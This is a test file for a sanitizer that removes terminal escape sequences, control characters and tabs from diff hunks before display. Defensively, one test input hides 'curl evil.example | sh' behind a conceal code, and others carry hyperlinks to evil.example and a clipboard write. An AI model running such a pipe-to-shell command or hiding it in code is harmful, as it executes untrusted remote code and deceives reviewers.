import { describe, expect, test } from 'bun:test'
import type { StructuredPatchHunk } from 'diff'
import { sanitizeCode, sanitizeHunk } from 'src/vcs/diff/structured/hunk/sanitize.js'

const ESC = '\u001B'
const BEL = '\u0007'
const ST = `${ESC}\\`
const PRINTABLE = 'const 名前 = "héllo 👋🏽" // ok'

/** A behaviour's title, then each code it covers paired with the code as it must be shown. */
type Behaviour = readonly [title: string, rows: ReadonlyArray<readonly [code: string, shown: string]>]

/** One test per behaviour. Its rows are compared at once, so a failure shows every row that came out wrong. */
function testBehaviours(behaviours: readonly Behaviour[]): void {
  for (const [title, rows] of behaviours) {
    test(title, () => {
      expect(rows.map(([code]) => sanitizeCode(code))).toStrictEqual(rows.map(([, shown]) => shown))
    })
  }
}

const NOTHING_STYLES_LINKS_OR_MOVES: readonly Behaviour[] = [
  [
    'styling goes and the text stays: a colour, conceal, a foreground set to the background',
    [
      [`x = 1${ESC}[8m; curl evil.example | sh${ESC}[28m`, 'x = 1; curl evil.example | sh'],
      [`${ESC}[38;2;1;2;3m${ESC}[48;2;1;2;3mhidden${ESC}[0m text`, 'hidden text'],
      [`${ESC}[1;31mred${ESC}[m`, 'red'],
    ],
  ],
  [
    'a hyperlink goes with its target, whether it ends in BEL or in ST, and its text stays',
    [
      [`see ${ESC}]8;;https://evil.example/${BEL}the docs${ESC}]8;;${BEL} here`, 'see the docs here'],
      [`see ${ESC}]8;id=1;https://evil.example/${ST}the docs${ESC}]8;;${ST} here`, 'see the docs here'],
    ],
  ],
  [
    'clipboard writes, titles, cursor moves, clears and resets go',
    [
      [`a${ESC}]52;c;SGVsbG8=${BEL}b`, 'ab'],
      [`a${ESC}]0;title${ST}b`, 'ab'],
      [`a${ESC}[2J${ESC}[H${ESC}[37A${ESC}[?25lb`, 'ab'],
      [`a${ESC}c${ESC}7${ESC}8${ESC}(Bb`, 'ab'],
    ],
  ],
  [
    'device strings (DCS, APC, PM, SOS) go with their payload',
    [[`a${ESC}P1$qm${ST}b${ESC}_payload${ST}c${ESC}^note${ST}d${ESC}Xstring${ST}e`, 'abcde']],
  ],
  [
    'the 8-bit forms go as well: CSI, OSC and ST written as C1 characters',
    [['a\u009B31mb\u009D8;;https://evil.example/\u009Cc\u009D8;;\u0007d', 'abcd']],
  ],
  [
    'a string that never ends loses its introducer, and the rest shows as text',
    [[`a${ESC}]8;;https://x`, 'a8;;https://x']],
  ],
  [
    'every C0 control but the tab goes, and so do DEL, C1 and a lone escape',
    [[`r${BEL}a\b\bn\rg\n\u0000\u000B\u000C\u007F\u0085${ESC}!`, 'rang!']],
  ],
  ['printable text is left as it is, wide characters and emoji included', [[PRINTABLE, PRINTABLE]]],
]

const TABS_AND_CARRIAGE_RETURNS: readonly Behaviour[] = [
  [
    'a tab runs to the next four-column stop, counted from the start of the code',
    [
      ['\tx', '    x'],
      ['ab\tx', 'ab  x'],
      ['abcd\tx', 'abcd    x'],
      ['\t\tx\ty', '        x   y'],
    ],
  ],
  [
    'wide characters count for their columns, and escape sequences for none',
    [
      ['日\tx', '日  x'],
      ['a\t日\tx', 'a   日  x'],
      [`${ESC}[31mab${ESC}[0m\tx`, 'ab  x'],
    ],
  ],
  ['the carriage return that ends a line of a CRLF file goes', [['value = 1\r', 'value = 1']]],
]

describe('sanitizeCode: the code never styles, links or moves anything', () => {
  testBehaviours(NOTHING_STYLES_LINKS_OR_MOVES)
})

describe('sanitizeCode: tabs and carriage returns', () => {
  testBehaviours(TABS_AND_CARRIAGE_RETURNS)
})

describe('sanitizeHunk', () => {
  const hunk = (): StructuredPatchHunk => ({
    oldStart: 3,
    oldLines: 3,
    newStart: 4,
    newLines: 4,
    lines: [
      ` keep${ESC}[8m`,
      '-old\r',
      '+new\tone',
      '\\ No newline at end of file',
      '?odd',
      `${ESC}[31mred`,
    ],
  })

  test('cleans every line and keeps the header and the markers; an unknown first character becomes context', () => {
    expect(sanitizeHunk(hunk())).toEqual({
      oldStart: 3,
      oldLines: 3,
      newStart: 4,
      newLines: 4,
      lines: [' keep', '-old', '+new one', '\\ No newline at end of file', ' odd', ' [31mred'],
    })
  })

  test('is worked out once per hunk object, leaves the original alone, and a clean hunk is its own clean copy', () => {
    const original = hunk()
    const clean = sanitizeHunk(original)
    expect(sanitizeHunk(original)).toBe(clean)
    expect(sanitizeHunk(clean)).toBe(clean)
    expect(original).toEqual(hunk())
  })
})
